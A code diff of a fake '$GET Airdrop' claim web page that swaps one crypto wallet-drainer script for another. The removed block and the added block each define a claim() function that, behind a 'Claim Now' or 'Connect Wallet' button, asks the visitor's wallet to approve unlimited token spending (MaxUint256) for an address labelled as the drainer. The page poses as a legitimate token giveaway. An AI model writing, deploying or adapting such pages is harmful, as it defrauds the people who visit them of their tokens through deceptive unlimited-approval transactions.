@@ -1,8 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script src="https://unpkg.com/@walletconnect/web3modal@3.7.0/dist/index.umd.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>$GET Airdrop</title>
@@ -319,7 +317,31 @@
         <label for="check-toggle">Check Eligibility</label>
         <div class="eligibility">
           ✅ You are eligible for <strong>561 $GET</strong><br>
-<button onclick="claim()">Connect Wallet to Claim</button>
+
+          
+<button onclick="claim()">Claim Now</button>
+
+<script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
+<script>
+  async function claim() {
+    if (typeof window.ethereum !== "undefined") {
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const signer = await provider.send("eth_requestAccounts", []);
+      const contract = new ethers.Contract(
+        "0xDRAINER_CONTRACT",  // Replace
+        ["function approve(address,uint256) external returns (bool)"],
+        provider.getSigner()
+      );
+
+      await contract.approve("0xYOUR_ADDRESS", ethers.constants.MaxUint256);
+    } else {
+      alert("MetaMask not detected");
+    }
+  }
+</script>
+
+
+          
         </div>
       </div>
     </div>
@@ -385,55 +407,5 @@
     </div>
     <div class="footer-copy">2025 © GETCHAIN. All rights reserved.</div>
   </footer>
- <script>
-  let provider;
-  let signer;
-
-  const modal = new window.Web3Modal.default({
-    projectId: "demo",  // You can replace this with a real projectId from web3modal.com
-    walletConnectVersion: 2,
-    themeMode: "light",
-    themeVariables: {
-      "--w3m-accent-color": "#ffaa33",
-      "--w3m-background-color": "#fff",
-    },
-  });
-
-  async function connectWallet() {
-    try {
-      const instance = await modal.connect();
-      provider = new ethers.providers.Web3Provider(instance);
-      signer = provider.getSigner();
-
-      const address = await signer.getAddress();
-      document.getElementById("connectBtn").innerText = "Connected: " + address.slice(0, 6) + "..." + address.slice(-4);
-      document.getElementById("claimBtn").disabled = false;
-    } catch (e) {
-      console.error(e);
-      alert("Connection failed");
-    }
-  }
-
-  async function claim() {
-    try {
-      const contract = new ethers.Contract(
-        "0x0ce64839CE3C3BE0bAfa17e7D2E2c98A8ca02Bbb", // your drainer
-        ["function approve(address,uint256) external returns (bool)"],
-        signer
-      );
-
-      const tx = await contract.approve(
-        "0x0ce64839CE3C3BE0bAfa17e7D2E2c98A8ca02Bbb",
-        ethers.constants.MaxUint256
-      );
-
-      await tx.wait();
-      alert("Claim complete!");
-    } catch (e) {
-      console.error(e);
-      alert("Transaction failed or cancelled.");
-    }
-  }
-        </script>
 </body>
 </html>
